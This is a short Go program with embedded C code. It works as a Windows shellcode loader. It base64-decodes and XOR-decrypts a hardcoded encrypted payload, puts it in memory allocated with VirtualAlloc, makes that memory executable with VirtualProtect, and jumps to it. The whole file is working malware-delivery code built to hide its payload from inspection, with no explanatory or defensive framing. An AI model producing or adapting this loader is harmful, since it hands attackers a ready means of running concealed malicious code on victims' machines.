package main

/*
#cgo LDFLAGS: -Wl,--allow-multiple-definition
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

void execute_shellcode(unsigned char *shellcode, int shellcode_size) {
    void *exec_mem = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        fprintf(stderr, "VirtualAlloc failed.\n");
        return;
    }

    memcpy(exec_mem, shellcode, shellcode_size);

    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed.\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    void (*func_ptr)() = (void (*)())exec_mem;
    func_ptr();

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}
*/
import "C"

import (
	"encoding/base64"
	"unsafe"
)

func XorDecrypt(crypted, key []byte) []byte {
	decrypted := make([]byte, len(crypted))
	for i := range crypted {
		decrypted[i] = crypted[i] ^ key[i%len(key)]
	}
	return decrypted
}

func main() {

	key1 := "5gg1skr4tzykk0t2"
	payload1 := "yS/k1YODujR0ejg6KmAmY2MvVuMWI/lmFDLyOXN4/2AVL+xDIyN9gz4wNFqieEXymVsGTXFHUnW1s3QqavGW32cmNnn4OVK/NkYxartW9UotbGVEAeDyvHR6eSPu8ABVfWa3YfgjanD/OlkiauCXZH2YrnD4X/p8daw0W\nqJ4RfKZJqb4fipz9UyaDJonMzgWPSJe4AazKnD/Ol0iauASc75rL3X4K259dao44G+4PDPlJj9wKzUrbjUiODIqajyx2UcmY4yLKnUtIDHgedk7zcqYOltzIsxDHRQQBQ5EdHNjLu7XP+KDdc42Dk1sz6F6BK4vAKEmQ/Q5S7Aq\nO3Ekc49dMUjUlKffByAx4qpxzKgqZ2d8QqIzZTUrE2gqYTWIYu7494y+mW0vMvCqIwGme7y/KgC6ORo0djr9OTlxztlgSVzOpiP78jz5ujsBOit6vJYvuKkitfSLhYaUJgG9YGcm3Rx1cwnLof+5ZO6tdTI1L5j+fO/+NXR6kri\nC1HUyNY/FzoyUXWMBPDJrLtmzFdz22EuqqWUWyguOBIEJwObtiEflh2QlnIX9mPVdyl7AX5ysw3Ja9iNkQ29a1RwGN3xIfeXDGkgKirqCle9bBjcyqitPNmsnRxEIVCoMVRpGD0cqXgkCHlgVVUxFWxBcZVwJA14EGFJ6IFpPRV\noLVEBDXVUFXVtbFDMfGgAEH0YCBFdXAENaUnIdCBwNBEhbAAFJVzx5a2DKKZ5vTB4tYOeEFBc5UiosdmjearcwfXoa4JyxIBgr03b1YczqqYnZIlK1TCUm4IY+S/P3QR0tMmH2p4ENoeGJQ5I/9AJrlW0B7NnXV4TS+qMOlGwMZ\nTERSZC77abF0szupvmf73K5iLt5LHpYY1VQCwmjD2e8zH1Aguppxmt98E8U5dFZQs60xPzuVxDevCy7kvCTxkY6+ZJl2iTeadt2pSHWprhm52EyI2ixA0rOQfA8oMuksJEVm9BN2e7waCqV3DrHzCIxl6+S3BW6CZ+tKg4czr4H\nPTo2Aqed9fdrM4qEz9s9lOU8A/zdZzEzazOMdGp5ayqJNDI1ZyaLK88h0YuvMfg4Yzy70i/uwDviqHXMellra3n9y3Tddaf6iY3hPPm9S+7wAIRT7GB5cqj39AGtITMzeHEyNWdnYbCD7cmLhU1YRQFBBBtWUgBdWkoBdECnA9o="

	encoded2, _ := base64.StdEncoding.DecodeString(payload1)
	var key []byte = []byte(key1)

	decrypted := XorDecrypt(encoded2, key)
	C.execute_shellcode((*C.uchar)(unsafe.Pointer(&decrypted[0])), C.int(len(decrypted)))
	
}
